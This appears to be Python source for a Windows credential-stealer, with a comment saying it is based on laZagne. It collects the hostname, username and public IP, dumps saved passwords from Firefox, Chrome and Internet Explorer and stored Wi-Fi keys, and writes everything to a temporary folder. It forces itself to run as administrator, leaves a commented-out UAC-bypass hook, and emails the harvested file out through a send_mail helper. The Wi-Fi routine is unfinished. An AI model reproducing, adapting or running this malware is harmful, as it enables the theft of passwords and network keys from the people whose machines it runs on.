import smtplib, zipfile, tempfile, os, platform, getpass, socket
import random, requests, io, datetime, time, sys, admin
from json import load
from urllib2 import urlopen
#BASED ON laZagne
from softwares.windows.secrets import Secrets
from softwares.wifi.wifipass import WifiPass
from softwares.browsers.mozilla import Mozilla
from softwares.browsers.chrome import Chrome
from softwares.browsers.opera import Opera
from softwares.browsers.ie import IE

from readytoship import send_mail 

start_time = time.time()

# Throw out random folder name
tempname = 'C:\\Kongfu%d' % random.randint(168, 1337) #ALWAYS, ALWAYS.

# Mark the current date-time
ts = time.time()
st = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')

# Find Public IP
target_ip = load(urlopen('http://jsonip.com'))['ip']

def main():
    # Get this
    print('\n')
    # Get hostname
    print(socket.gethostname())
    # Get account name
    print(getpass.getuser())
    # Get IP Addr
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("gmail.com",80))
    print(s.getsockname()[0])
    print(target_ip)
    print('\n')
    # Close file 
    # Close socket
    s.close()

    return True

def get_passwords():
    print(Mozilla().run())
    print(Chrome().run())
    print(IE().run())
    #print(Secrets().run())
    print(WifiPass().run())


def create_files():
    os.system('mkdir %s' % tempname)
    os.system('break > %s\\info.txt' % tempname)
    info = '%s\\info.txt' % tempname
    sys.stdout=open(info,"a")

def print_runtime_footer():
    elapsed_time = time.time() - start_time
    print 'Total running time = ' + str(elapsed_time) + ' Sec.'
    print(st)
    #print 'Username:RID:LMHash:NTHash:::'
    #print ' https://crackstation.net/'
	
#Incompleted
def get_wifi_pass():
    f=open('wifipass.txt','w')
    k=subprocess.Popen(['netsh','wlan','show','profiles'],stdout=subprocess.PIPE)
    profiles=re.findall(': (.*)\r',k.communicate()[0])
    for x in profiles:
        proc=subprocess.Popen(['netsh','wlan','show','profiles',x ,'key=clear'],stdout=subprocess.PIPE)
        output=re.findall('(Key Content.*)\r',proc.communicate()[0])
    if output:
        print x + '\n' + output[0] + '\n'

if __name__ == '__main__':
	# BYPASS UAC.
	# uac.bypass.dll()
    # Force to run w/ privilege
    if not admin.isUserAdmin():
        admin.runAsAdmin()
    else:
        create_files()
        main()
        get_passwords()
#        get_wifi_pass()
        print_runtime_footer()
        sys.stdout.close()
        send_mail(tempname)